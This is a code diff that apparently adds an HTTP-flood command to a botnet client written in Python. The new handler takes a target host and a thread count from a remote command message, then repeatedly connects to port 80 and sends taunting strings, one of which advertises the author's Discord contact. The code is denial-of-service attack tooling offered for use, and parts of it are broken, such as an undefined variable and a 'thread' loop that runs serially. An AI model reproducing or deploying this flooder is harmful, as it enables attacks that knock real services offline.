@@ -93,6 +93,37 @@ def system():
 						except:
 							pass
 					tcpflood()
+
+				if ">http" in msg.lower():
+					def httpflooder():
+						try:
+							target = msg.split(" ")[1]
+							numThreads = int(msg.split(" ")[2])
+
+							resolvedTarget = socket.gethostbyname(target)
+
+							message = ["Hello, and I am sorry but, goodbye!", "Routers are such fragile things, aren't they?", "This message is dank af", "Discord: [SuperNova] Law#6800 <== Contact me if u want :3", "Humans are so bad with DDoS protection :)"]
+
+							print("Command Accepted!")
+							print("HTTP: Sent to %s with %s threads!" % (ip, numThreads))
+
+							def httpflood():
+								sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+								try:
+									randomMsg = random.choice(message)
+									sock.connect((target, 80))
+									sock.send(randomMsg)
+									sock.sendto(randomMsg, (resolvedTarget, 80))
+									sock.send(randomMsg)
+								except socket.error:
+									pass
+								sock.close()
+
+							for i in range(1, numThreads):
+								httpflood()
+						except:
+							pass
+					httpflooder()
 			commands()
 			threads = []
 			for i in range(1):
